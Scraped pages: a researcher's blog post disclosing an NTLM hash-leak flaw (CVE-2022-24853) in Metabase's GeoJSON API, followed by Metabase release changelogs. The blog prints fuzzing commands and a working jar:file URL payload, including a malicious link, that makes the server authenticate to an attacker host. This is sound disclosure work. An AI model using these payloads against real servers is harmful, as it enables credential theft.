=== Content from secure77.de_6d7e0615_20250115_210725.html ===


[![Secure77](https://secure77.de/wp-content/uploads/2022/09/Zeichenflaeche-1white.png)](https://secure77.de/)

[Toggle Side Menu](#sidr)

* [Home](https://secure77.de/home/)
* [Notes](https://notes.secure77.de)
* [Subjects](https://secure77.de/category/subjects/)
  + [Researches](https://secure77.de/category/subjects/researches/)
  + [Sheets](https://secure77.de/category/subjects/sheets/)
  + [Misc](https://secure77.de/category/subjects/misc/)
* [Development](https://secure77.de/category/development/)
  + [Projects](https://secure77.de/category/development/projects/)
  + [Perlite](https://secure77.de/perlite/)
  + [Scripts / Tools](https://secure77.de/category/development/scripts/)
* [Links](https://secure77.de/links-partner/)
* [Impressum](https://secure77.de/impressum/)
* [About Me](https://secure77.de/about-me/)

[Secure77](https://secure77.de/)

Techblog and Security

![](https://secure77.de/wp-content/uploads/2021/12/image-9.png)

# NTLM Attack in Metabase CVE-2022-24853

Posted: [14. Februar 2022](https://secure77.de/metabase-ntlm-relay-attack/ "20:56") *by* [secure77](https://secure77.de/author/blogadminsecure77/ "BeitrÃ¤ge von secure77")

[Researches](https://secure77.de/category/subjects/researches/)

## Metabase GeoJSON API Endpoint

Back in September 2021, [Metabase](https://www.metabase.com/) released a security announcement regarding its GeoJSON API endpoint: [GeoJSON URL validation can expose server files and environment variables to unauthorized users](https://github.com/metabase/metabase/security/advisories/GHSA-w73v-6p7p-fpfr)

> Weâ€™ve discovered a potential security issue with the [custom GeoJSON map](https://www.metabase.com/docs/latest/administration-guide/20-custom-maps.html) (admin->settings->maps->custom maps->add a map) support and potential local file inclusion (including environment variables). This issue is fixed in a new maintenance release (1.40.5). Only versions 1.40.0-1.40.4 are affected.

Curious about this issue, I downloaded the newly released version 0.40.5 and started looking at this API endpoint.

Of course you need to provide a valid admin cookie to pass the authentication filter introduced with this new version. But maybe there is still something to find.

I created an admin account and started fuzzing the API Endpoint `/api/geojson?url=`

And after trying different special chars and characters I found a strange behavior when you pass different URL schemes.

```
ffuf -u 'http://<metbaseURL>:3000/api/geojson?url=FUZZ://attacker' -w /usr/share/seclists/Miscellaneous/schemes.txt -H 'Cookie: metabase.DEVICE=<device>; metabase.SESSION=<session>' -fw 65 -mc all
```
[![](https://secure77.de/wp-content/uploads/2021/12/image.png)](https://secure77.de/wp-content/uploads/2021/12/image.png)

Looking at these URL schemes deeper we can recognize some special behavior between them.

1. HTTP, HTTPS works as designed

```
GET /api/geojson?url=http://<attacker> HTTP/1.1
Host: localhost:3000
```

response:

```
GeoJSON URL failed to load
```

2. File, mailto and FTP responses with the following

```
Invalid GeoJSON file location: must either start with http:// or https:// or be a relative path to a file on the classpath. URLs referring to hosts that supply internal hosting metadata are prohibited.
```

3. coaps+tcp etc. or chunk schemes and also JAR was interesting, because they give me a detailed stack trace

[![](https://secure77.de/wp-content/uploads/2021/12/image-1-1024x643.png)](https://secure77.de/wp-content/uploads/2021/12/image-1.png)
[![](https://secure77.de/wp-content/uploads/2021/12/image-9.png)](https://secure77.de/wp-content/uploads/2021/12/image-9.png)

I found a difference between chunk and JAR requests, which points me to further investigations.

## JAR URL Handler

so sending a request like this

```
GET /api/geojson?url=jar://<attacker> HTTP/1.1
Host: localhost:3000
```

will trigger the following response

[![](https://secure77.de/wp-content/uploads/2021/12/image-2-1024x733.png)](https://secure77.de/wp-content/uploads/2021/12/image-2.png)

it seems that Metabase passes the URL still to the java.net.URL handler. So this is a parser differential issue.

providing the missing !/ in the URL leads to this error message

[![](https://secure77.de/wp-content/uploads/2021/12/image-3-1024x168.png)](https://secure77.de/wp-content/uploads/2021/12/image-3.png)

So something happens here. I tried various things and my goal was to bypass the filter to get file read access on the server.

After some time and various tries I figured out how to create a URL that doesnâ€™t trigger the stack trace and run through.

[![](https://secure77.de/wp-content/uploads/2021/12/image-4-1024x476.png)](https://secure77.de/wp-content/uploads/2021/12/image-4.png)

Although the response does not print the contents of the file, with Procom I could proof that file access still occurs on the server.

[![](https://secure77.de/wp-content/uploads/2021/12/image-5-1024x288.png)](https://secure77.de/wp-content/uploads/2021/12/image-5.png)

So this was a first confirmation that you can bypass the implemented â€žfileâ€œ filter. However, if the file content is not printed in the response, then this is useless. So my next thought was, if I canâ€™t â€žreadâ€œ local files, maybe I can read remote files. There are many java deserialization attacks, if Metabase tries to read and execute jar files maybe there is a way to exploit it.

So I set up a responder and tried to receive anything on my remote VM

## NTLM Reflection Attack

Since I was testing from a Windows box, I surprisingly realized that the file schema allowed me to get the Windows NTLMv2 hash from the Metabase Server.

So sending this:

```
GET /api/geojson?url=jar:file:\\<attacker>\test.txt!/ HTTP/1.1
Host: localhost:3000
```
[![](https://secure77.de/wp-content/uploads/2021/12/image-6-1024x536.png)](https://secure77.de/wp-content/uploads/2021/12/image-6.png)

will give us the hash for the user as Metabase is running

[![](https://secure77.de/wp-content/uploads/2021/12/image-7-1024x113.png)](https://secure77.de/wp-content/uploads/2021/12/image-7.png)

I researched about this Java NTLM topic and found a interesting BlackHat presentation from 2019: <https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf>

There could be more vulnerabilities, but at this point I decided to stop my research and report this issue to Metabase. They responded immediately, very gratefully, and promised to fix this vulnerability.

## Conclusion

Take the vectors together, this exploit is only possible if

* Metabase runs on a Windows System
* The API call is executed by someone who have admin privileges in Metabase

But as the API call is just a GET request, the attack vector is more trivial as soon you can lure a logged in metabase admin to click your malicious link.

So a simple click to this link can lead to a password hash steal:

`http://metabase-target-server.com/api/geojson?url=jar:file:\<attacker-ip>\test.txt!/`

## Fix and Timeline

* October 12, 2021: I reported the issue to Metabase through security@metabase.com
* October 12, 2021: Immediately response from Metabase, that they are planning to remove this endpoint completely
* December 13, 2021: Mail from Metabase about release of the Version v41.4 where this should be fixed and if I can double check this
* December 13, 2021: Retest from my site and mail to Metabase, that this vulnerability still exists and is not fixed by the latest release, including a more detailed description for reproducing
* December 13, 2021: Confirmation from Metabase, that this can be reproduced and they are working on a fix
* Januar 24, 2022: Release of (rc) Version v42, where this should be fixed
* Februar 1, 2022: Retest and confirmed that it is fixed
* April 14, 2022: Release of the security advisory [Make GeoJSON URL read fully conditional on validation](https://github.com/metabase/metabase/security/advisories/GHSA-5cfq-582c-c38m) and [CVE-2022-24853](https://nvd.nist.gov/vuln/detail/CVE-2022-24853)

> Metabase has a proxy to load arbitrary URLs for JSON maps as part of our GeoJSON support. While we do validation to not return contents of arbitrary URLs, there is a case where a particularly crafted request could result in file access on windows, which allows enabling anÂ [NTLM relay attack](https://www.qomplx.com/qomplx-knowledge-ntlm-relay-attacks-explained/), potentially allowing an attacker to receive the password hash.

## Affected versions

<x.42.3 <x.41.6, <x.40.7

### Patches

The following patches (or greater versions) are available:

* 0.42.4 and 1.42.4
* 0.41.7 and 1.41.7
* 0.40.8 and 1.40.8

## Information Disclosure

This Blog Post was only published after the fixed release from Metabase.

### Schreibe einen Kommentar [Antworten abbrechen](/metabase-ntlm-relay-attack/#respond)

Deine E-Mail-Adresse wird nicht verÃ¶ffentlicht. Erforderliche Felder sind mit \* markiert

Kommentar \*

Name \*

E-Mail \*

Website

 Meinen Namen, meine E-Mail-Adresse und meine Website in diesem Browser fÃ¼r die nÃ¤chste Kommentierung speichern.

Î”

Copyright Â© 2025 Â· All Rights Reserved Â·
Secure77 Â· Theme: Portfolio Lite by [Organic Themes](http://organicthemes.com/)

This website uses cookies and google analytics. If you continue to use the website, we assume that you agree.OK[DatenschutzerklÃ¤rung](https://secure77.de/datenschutzerklaerung/)



=== Content from github.com_36a7b127_20250115_210752.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmetabase%2Fmetabase%2Freleases)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmetabase%2Fmetabase%2Freleases)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Freleases%2Findex&source=header-repo&source_repo=metabase%2Fmetabase)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[metabase](/metabase)
/
**[metabase](/metabase/metabase)**
Public

* [Notifications](/login?return_to=%2Fmetabase%2Fmetabase) You must be signed in to change notification settings
* [Fork
  5.2k](/login?return_to=%2Fmetabase%2Fmetabase)
* [Star
   39.4k](/login?return_to=%2Fmetabase%2Fmetabase)

* [Code](/metabase/metabase)
* [Issues
  4k](/metabase/metabase/issues)
* [Pull requests
  376](/metabase/metabase/pulls)
* [Actions](/metabase/metabase/actions)
* [Projects
  0](/metabase/metabase/projects)
* [Wiki](/metabase/metabase/wiki)
* [Security](/metabase/metabase/security)
* [Insights](/metabase/metabase/pulse)

Additional navigation options

* [Code](/metabase/metabase)
* [Issues](/metabase/metabase/issues)
* [Pull requests](/metabase/metabase/pulls)
* [Actions](/metabase/metabase/actions)
* [Projects](/metabase/metabase/projects)
* [Wiki](/metabase/metabase/wiki)
* [Security](/metabase/metabase/security)
* [Insights](/metabase/metabase/pulse)

# Releases: metabase/metabase

[Releases](/metabase/metabase/releases)
[Tags](/metabase/metabase/tags)

Releases Â· metabase/metabase
## Metabase 52.6

15 Jan 17:52

![@github-actions](https://avatars.githubusercontent.com/in/15368?s=40&v=4)
[github-actions](/apps/github-actions)

[v0.52.6](/metabase/metabase/tree/v0.52.6)

[`1a9cb72`](/metabase/metabase/commit/1a9cb727b982b1b3af9a4a94c778a5a6c7e40b91)

This commit was created on GitHub.com and signed with GitHubâ€™s **verified signature**.

GPG key ID: B5690EEEBB952194

[Learn about vigilant mode](https://docs.github.com/github/authenticating-to-github/displaying-verification-statuses-for-all-of-your-commits).

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/metabase/metabase/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...v0.52.6)

 Loading

[View all tags](/metabase/metabase/tags)

[Metabase 52.6](/metabase/metabase/releases/tag/v0.52.6)
[Latest](/metabase/metabase/releases/latest)

[Latest](/metabase/metabase/releases/latest)

## Upgrading

> Before you upgrade, back up your Metabase application database!

Check out our [upgrading instructions](https://metabase.com/docs/latest/operations-guide/upgrading-metabase).

[Get the most out of Metabase](https://www.metabase.com/pricing?utm_source=github&utm_medium=release-notes&utm_campaign=plan-comparison). Learn more about advanced features, managed cloud, and first-class support.

## Metabase Open Source

Docker image: [`metabase/metabase:v0.52.6.x`](https://hub.docker.com/r/metabase/metabase/tags)

JAR download: <https://downloads.metabase.com/v0.52.6.x/metabase.jar>

## Metabase Enterprise

Docker image: [`metabase/metabase-enterprise:v1.52.6.x`](https://hub.docker.com/r/metabase/metabase-enterprise/tags)

JAR download: <https://downloads.metabase.com/enterprise/v1.52.6.x/metabase.jar>

## Changelog

### Enhancements

**Visualizations**

* Fix pivot drill thru for multi-stage queries ([#51950](https://github.com/metabase/metabase/pull/51950))
* Fix performance of CSV pivot table export ([#51985](https://github.com/metabase/metabase/pull/51985))

**Database**

* Databricks OAuth M2M authentication ([#51900](https://github.com/metabase/metabase/pull/51900))
* Make key-pair the default auth method for Snowflake ([#51248](https://github.com/metabase/metabase/issues/51248))
* Better handling of broken database connections ([#51176](https://github.com/metabase/metabase/issues/51176))
* Fix clickhouse uploads ([#52181](https://github.com/metabase/metabase/pull/52181))

**Embedding SDK**

* Update error colors following the new design ([#52029](https://github.com/metabase/metabase/pull/52029))
* SDK builds created with `--watch` don't seem to work with cypress anymore ([#51930](https://github.com/metabase/metabase/issues/51930))
* Convert ChartsettingOrderedItems to match ChartSettingSelect ([#51332](https://github.com/metabase/metabase/pull/51332))
* Fix ChartSettingsPopover style/z-index issues ([#51154](https://github.com/metabase/metabase/pull/51154))
* fix(sdk): Fix alignment of ColorSelector in SDK Chart Settings ([#51000](https://github.com/metabase/metabase/pull/51000))
* feat(sdk): Modify Interactive Question Layout ([#50152](https://github.com/metabase/metabase/pull/50152))

**Other**

* Run search index worker on every instance ([#52108](https://github.com/metabase/metabase/pull/52108))
* Enable realtime search indexing without experimental flag ([#52018](https://github.com/metabase/metabase/pull/52018))
* Add trace logging for search index queue, and fix timer ([#52017](https://github.com/metabase/metabase/pull/52017))
* Refactor collection list query for performance ([#51929](https://github.com/metabase/metabase/pull/51929))
* [Notification] reduce memory footprint ([#51708](https://github.com/metabase/metabase/pull/51708))
* Show errors from backend in Create API key modal ([#51395](https://github.com/metabase/metabase/pull/51395))

### Bug fixes

**Querying**

* YoY vizualisation displays two '1st week' datapoints for year 2025 ([#51777](https://github.com/metabase/metabase/issues/51777))
* Query results with aggregations are not correctly cached ([#51672](https://github.com/metabase/metabase/issues/51672))

**Dashboards**

* Removing the source filter from a linked filter will leave the latter broken (and with an invalid reference) ([#49556](https://github.com/metabase/metabase/issues/49556))
* Field Filters get unlinked the moment you make changes to other Filters inside a Dashboard ([#51957](https://github.com/metabase/metabase/issues/51957))
* Long text in text cards should be wrapped in mobile viewports ([#35337](https://github.com/metabase/metabase/issues/35337))
* Dashboard/bell icon in emails should line up with top of email title ([#18791](https://github.com/metabase/metabase/issues/18791))

**Visualization**

* Pivot table does not render until its viewport is resized ([#51926](https://github.com/metabase/metabase/issues/51926))
* Cannot Change Format of Date for X or Y Axis ([#51839](https://github.com/metabase/metabase/issues/51839))
* Missing "pivot table" button after last update ([#9874](https://github.com/metabase/metabase/issues/9874))
* Map should be zoomable/pannable via mouse scroll ([#9437](https://github.com/metabase/metabase/issues/9437))
* Problem with time series using the Log scale ([#4286](https://github.com/metabase/metabase/issues/4286))

**Other**

* Switching Snowflake to RSA Auth after Password Auth is Confusing ([#51057](https://github.com/metabase/metabase/issues/51057))
* Basic actions do not work for models with a UUID primary key ([#47139](https://github.com/metabase/metabase/issues/47139))
* We're activating users on destination instances when loading entities with serialization ([#51801](https://github.com/metabase/metabase/issues/51801))

 Assets
2

 Loading

 â¤ï¸
1
 alexyarosh reacted with heart emoji

All reactions

* â¤ï¸
  1 reaction

 1 person reacted

## Metabase 51.12

15 Jan 17:53

![@github-actions](https://avatars.githubusercontent.com/in/15368?s=40&v=4)
[github-actions](/apps/github-actions)

[v0.51.12](/metabase/metabase/tree/v0.51.12)

[`4dfe754`](/metabase/metabase/commit/4dfe75493c94dff1adc7ee732e8e4da0c6e3b09e)

This commit was created on GitHub.com and signed with GitHubâ€™s **verified signature**.

GPG key ID: B5690EEEBB952194

[Learn about vigilant mode](https://docs.github.com/github/authenticating-to-github/displaying-verification-statuses-for-all-of-your-commits).

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/metabase/metabase/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...v0.51.12)

 Loading

[View all tags](/metabase/metabase/tags)

[Metabase 51.12](/metabase/metabase/releases/tag/v0.51.12)

## Upgrading

> Before you upgrade, back up your Metabase application database!

Check out our [upgrading instructions](https://metabase.com/docs/latest/operations-guide/upgrading-metabase).

[Get the most out of Metabase](https://www.metabase.com/pricing?utm_source=github&utm_medium=release-notes&utm_campaign=plan-comparison). Learn more about advanced features, managed cloud, and first-class support.

## Metabase Open Source

Docker image: [`metabase/metabase:v0.51.12.x`](https://hub.docker.com/r/metabase/metabase/tags)

JAR download: <https://downloads.metabase.com/v0.51.12.x/metabase.jar>

## Metabase Enterprise

Docker image: [`metabase/metabase-enterprise:v1.51.12.x`](https://hub.docker.com/r/metabase/metabase-enterprise/tags)

JAR download: <https://downloads.metabase.com/enterprise/v1.51.12.x/metabase.jar>

## Changelog

### Enhancements

* Grid color in the EditableDashboard component should be themeable in the sdk ([#47567](https://github.com/metabase/metabase/issues/47567))
* Fix zoom-in.geographic drill thru for multi-stage queries ([#51891](https://github.com/metabase/metabase/pull/51891))
* Fix quick-filter drill thru for multi-stage queries ([#51807](https://github.com/metabase/metabase/pull/51807))
* Create serialization users as inactive ([#51861](https://github.com/metabase/metabase/pull/51861))

 Assets
2

 Loading

All reactions

## Metabase 52.5

08 Jan 14:58

![@github-actions](https://avatars.githubusercontent.com/in/15368?s=40&v=4)
[github-actions](/apps/github-actions)

[v0.52.5](/metabase/metabase/tree/v0.52.5)

[`cc77eeb`](/metabase/metabase/commit/cc77eeb65547f607346cc33043468d5cfdd27117)

This commit was created on GitHub.com and signed with GitHubâ€™s **verified signature**.

GPG key ID: B5690EEEBB952194

[Learn about vigilant mode](https://docs.github.com/github/authenticating-to-github/displaying-verification-statuses-for-all-of-your-commits).

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/metabase/metabase/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...v0.52.5)

 Loading

[View all tags](/metabase/metabase/tags)

[Metabase 52.5](/metabase/metabase/releases/tag/v0.52.5)

## Upgrading

> Before you upgrade, back up your Metabase application database!

Check out our [upgrading instructions](https://metabase.com/docs/latest/operations-guide/upgrading-metabase).

[Get the most out of Metabase](https://www.metabase.com/pricing?utm_source=github&utm_medium=release-notes&utm_campaign=plan-comparison). Learn more about advanced features, managed cloud, and first-class support.

## Metabase Open Source

Docker image: [`metabase/metabase:v0.52.5.x`](https://hub.docker.com/r/metabase/metabase/tags)

JAR download: <https://downloads.metabase.com/v0.52.5.x/metabase.jar>

## Metabase Enterprise

Docker image: [`metabase/metabase-enterprise:v1.52.5.x`](https://hub.docker.com/r/metabase/metabase-enterprise/tags)

JAR download: <https://downloads.metabase.com/enterprise/v1.52.5.x/metabase.jar>

## Changelog

### Enhancements

* Make JWT Identity Provider URI Setting optional ([#51826](https://github.com/metabase/metabase/issues/51826))
* Grid color in the EditableDashboard component should be themeable in the sdk ([#47567](https://github.com/metabase/metabase/issues/47567))
* Small a11y improvements ([#51577](https://github.com/metabase/metabase/pull/51577))

### Bug fixes

* Graph lines are disappear after mouse over ([#51383](https://github.com/metabase/metabase/issues/51383))

 Assets
2

 Loading

 ðŸ‘
3
 ErcinDedeoglu, xuhangcj, and jeaninerenee reacted with thumbs up emoji
 ðŸŽ‰
2
 ErcinDedeoglu and xuhangcj reacted with hooray emoji
 â¤ï¸
1
 qcind reacted with heart emoji
 ðŸš€
2
 ErcinDedeoglu and xuhangcj reacted with rocket emoji

All reactions

* ðŸ‘
  3 reactions
* ðŸŽ‰
  2 reactions
* â¤ï¸
  1 reaction
* ðŸš€
  2 reactions

 4 people reacted

## Metabase 51.11

08 Jan 15:59

![@github-actions](https://avatars.githubusercontent.com/in/15368?s=40&v=4)
[github-actions](/apps/github-actions)

[v0.51.11](/metabase/metabase/tree/v0.51.11)

[`02729cf`](/metabase/metabase/commit/02729cf4c2ac66a826aa61499d3f316cf5a07026)

This commit was created on GitHub.com and signed with GitHubâ€™s **verified signature**.

GPG key ID: B5690EEEBB952194

[Learn about vigilant mode](https://docs.github.com/github/authenticating-to-github/displaying-verification-statuses-for-all-of-your-commits).

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/metabase/metabase/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...v0.51.11)

 Loading

[View all tags](/metabase/metabase/tags)

[Metabase 51.11](/metabase/metabase/releases/tag/v0.51.11)

## Upgrading

> Before you upgrade, back up your Metabase application database!

Check out our [upgrading instructions](https://metabase.com/docs/latest/operations-guide/upgrading-metabase).

[Get the most out of Metabase](https://www.metabase.com/pricing?utm_source=github&utm_medium=release-notes&utm_campaign=plan-comparison). Learn more about advanced features, managed cloud, and first-class support.

## Metabase Open Source

Docker image: [`metabase/metabase:v0.51.11`](https://hub.docker.com/r/metabase/metabase/tags)

JAR download: <https://downloads.metabase.com/v0.51.11/metabase.jar>

## Metabase Enterprise

Docker image: [`metabase/metabase-enterprise:v1.51.11`](https://hub.docker.com/r/metabase/metabase-enterprise/tags)

JAR download: <https://downloads.metabase.com/enterprise/v1.51.11/metabase.jar>

## Changelog

### Enhancements

* Fix compare-aggregations drill for multi-stage queries ([#51608](https://github.com/metabase/metabase/pull/51608))
* Fix the zoom-in.binning drill thru for multi-stage queries ([#51489](https://github.com/metabase/metabase/pull/51489))
* Fix method definitions in Databricks driver ([#51473](https://github.com/metabase/metabase/pull/51473))

 Assets
2

 Loading

All reactions

## Metabase 51.10

24 Dec 15:02

![@github-actions](https://avatars.githubusercontent.com/in/15368?s=40&v=4)
[github-actions](/apps/github-actions)

[v0.51.10](/metabase/metabase/tree/v0.51.10)

[`e9d96ac`](/metabase/metabase/commit/e9d96acf2249ac6ff6337c39f0276fbef90ad646)

This commit was created on GitHub.com and signed with GitHubâ€™s **verified signature**.

GPG key ID: B5690EEEBB952194

[Learn about vigilant mode](https://docs.github.com/github/authenticating-to-github/displaying-verification-statuses-for-all-of-your-commits).

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/metabase/metabase/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...v0.51.10)

 Loading

[View all tags](/metabase/metabase/tags)

[Metabase 51.10](/metabase/metabase/releases/tag/v0.51.10)

## Upgrading

> Before you upgrade, back up your Metabase application database!

Check out our [upgrading instructions](https://metabase.com/docs/latest/operations-guide/upgrading-metabase).

[Get the most out of Metabase](https://www.metabase.com/pricing?utm_source=github&utm_medium=release-notes&utm_campaign=plan-comparison). Learn more about advanced features, managed cloud, and first-class support.

## Metabase Open Source

Docker image: [`metabase/metabase:v0.51.10`](https://hub.docker.com/r/metabase/metabase/tags)

JAR download: <https://downloads.metabase.com/v0.51.10/metabase.jar>

## Metabase Enterprise

Docker image: [`metabase/metabase-enterprise:v1.51.10`](https://hub.docker.com/r/metabase/metabase-enterprise/tags)

JAR download: <https://downloads.metabase.com/enterprise/v1.51.10/metabase.jar>

## Changelog

### Enhancements

**Embedding**

* docs(sdk): fix initial parameter props name in dashboards ([#51625](https://github.com/metabase/metabase/pull/51625))
* fix(types): fix type error on textCard in static-dashboard.cy.spec.tsx ([#51450](https://github.com/metabase/metabase/pull/51450))
* ci(sdk): skip flaky mantine styles test for sdk ([#51404](https://github.com/metabase/metabase/pull/51404))
* ci(sdk): fix and re-enable e2e workflow for 51 branch ([#51327](https://github.com/metabase/metabase/pull/51327))
* fix(sdk): wrap InteractiveDashboard with renderOnlyInSdkProvider ([#51224](https://github.com/metabase/metabase/pull/51224))
* fix(sdk): update define function names in Next.js compat ([#51071](https://github.com/metabase/metabase/pull/51071))
* Manual backport 50656 to 51 ([#50848](https://github.com/metabase/metabase/pull/50848))
* Support providing parameter values in InteractiveQuestion in the sdk ([#50493](https://github.com/metabase/metabase/issues/50493))
* Move non-auth sdk config to MetabaseProvider props and rename field to authConfig ([#50486](https://github.com/metabase/metabase/issues/50486))
* Replace public-facing type prefixes in the sdk to Metabase ([#50396](https://github.com/metabase/metabase/issues/50396))

**Querying**

* Fix summarize-column and summarize-column-by-time drills for multi-stage queries ([#51553](https://github.com/metabase/metabase/pull/51553))
* Avoid frequent setState calls in the add parameter popover in dashboards ([#51373](https://github.com/metabase/metabase/pull/51373))
* Update underlying-records drill to use code in lib.drill-thru.common ([#51254](https://github.com/metabase/metabase/pull/51254))

**Other**

* Don't crash for ignored status codes in embedding responses ([#51408](https://github.com/metabase/metabase/pull/51408)) ([#51487](https://github.com/metabase/metabase/pull/51487))
* Update SDK version to 0.51.13 ([#51458](https://github.com/metabase/metabase/pull/51458))
* Create and use custom redux context on the sdk ([#51398](https://github.com/metabase/metabase/issues/51398))
* Make static/public/sdk (LocaleProvider) support locales in the `xx-yy` format, and also support the fallback to `xx` if `xx-yy` doesn't exist ([#51039](https://github.com/metabase/metabase/issues/51039))
* [SDK] nextjs: document the compatibility layer ([#50440](https://github.com/metabase/metabase/issues/50440))

### Bug fixes

**Embedding**

* Downloading results of an embedded question (via iframe) fails ([#51386](https://github.com/metabase/metabase/issues/51386))

**Querying**

* New Metrics API misses human-friendly text metric definition ([#51303](https://github.com/metabase/metabase/issues/51303))

**Visualization**

* Changes to Scatterplot Tooltip Default Behavior is a Breaking change for Some Customers ([#51483](https://github.com/metabase/metabase/issues/51483))

 Assets
2

 Loading

 ðŸ‘
1
 stevleibelt reacted with thumbs up emoji
 ðŸš€
1
 qcind reacted with rocket emoji

All reactions

* ðŸ‘
  1 reaction
* ðŸš€
  1 reaction

 2 people reacted

## Metabase 52.4

23 Dec 15:17

![@github-actions](https://avatars.githubusercontent.com/in/15368?s=40&v=4)
[github-actions](/apps/github-actions)

[v0.52.4](/metabase/metabase/tree/v0.52.4)

[`2f8c560`](/metabase/metabase/commit/2f8c560ddd770dcdd8e6ef138fbc0f32c50b4b08)

This commit was created on GitHub.com and signed with GitHubâ€™s **verified signature**.

GPG key ID: B5690EEEBB952194

[Learn about vigilant mode](https://docs.github.com/github/authenticating-to-github/displaying-verification-statuses-for-all-of-your-commits).

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/metabase/metabase/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...v0.52.4)

 Loading

[View all tags](/metabase/metabase/tags)

[Metabase 52.4](/metabase/metabase/releases/tag/v0.52.4)

## Upgrading

> Before you upgrade, back up your Metabase application database!

Check out our [upgrading instructions](https://metabase.com/docs/latest/operations-guide/upgrading-metabase).

[Get the most out of Metabase](https://www.metabase.com/pricing?utm_source=github&utm_medium=release-notes&utm_campaign=plan-comparison). Learn more about advanced features, managed cloud, and first-class support.

## Metabase Open Source

Docker image: [`metabase/metabase:v0.52.4`](https://hub.docker.com/r/metabase/metabase/tags)

JAR download: <https://downloads.metabase.com/v0.52.4/metabase.jar>

## Metabase Enterprise

Docker image: [`metabase/metabase-enterprise:v1.52.4`](https://hub.docker.com/r/metabase/metabase-enterprise/tags)

JAR download: <https://downloads.metabase.com/enterprise/v1.52.4/metabase.jar>

## Changelog

#

### Enhancements

**Database**

* Add basic auth capabilities to Druid JDBC ([#45728](https://github.com/metabase/metabase/issues/45728))

**Visualization**

* Add percentages to Sankey tooltip ([#51193](https://github.com/metabase/metabase/pull/51193))

**Querying**

* Add logging for linked filter queries ([#46888](https://github.com/metabase/metabase/issues/46888))

**Other**

* perf: Add fastpaths to url? and email? predicates ([#51522](https://github.com/metabase/metabase/pull/51522))
* [openapi] reduce amount of oneOf/allOf we generate in documentation ([#51495](https://github.com/metabase/metabase/pull/51495))
* [Clean-up] Allow collection clean up banner to be dismissible ([#51434](https://github.com/metabase/metabase/pull/51434))
* Send pulse asynchronously with a small pool size ([#51380](https://github.com/metabase/metabase/pull/51380))
* Remove translation for slack error ([#51375](https://github.com/metabase/metabase/pull/51375))
* Add prometheus metric for search errors ([#51357](https://github.com/metabase/metabase/pull/51357))
* Co-ordinate Search Index creation and rotation between instances ([#51279](https://github.com/metabase/metabase/issues/51279))

### Bug fixes

**Database**

* Cannot Filter on UUID ID Columns in SQL Server / Azure Synpase ([#51189](https://github.com/metabase/metabase/issues/51189))
* Filtering on a multi stage question in MongoDB results in a non-working query ([#50832](https://github.com/metabase/metabase/issues/50832))

**Dashboards**

